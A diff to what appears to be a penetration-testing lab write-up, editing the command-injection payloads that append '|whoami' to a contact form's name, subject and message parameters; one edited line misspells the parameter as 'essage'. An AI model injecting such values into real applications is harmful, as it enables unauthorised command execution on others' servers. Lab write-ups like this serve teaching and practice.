@@ -94,13 +94,13 @@ Began systematic testing of each parameter by appending `|whoami` to the value. 
 **Payloads Tested:**
 ```http
 # Name parameter test
-name=test|whoami&email=test@test.com&subject=test&message=test
+name=TEST|whoami
 
 # Subject parameter test
-name=test&email=test@test.com&subject=test|whoami&message=test
+subject=testvulnerability|whoami
 
 # Message parameter test
-name=test&email=test@test.com&subject=test&message=test|whoami
+essage=HEREwego|whoami
 ```
 
 <img width="1920" height="982" alt="LAB2_ss4" src="https://github.com/user-attachments/assets/3df2ea0e-921e-4f62-a52f-47dabbcc9fa0" />
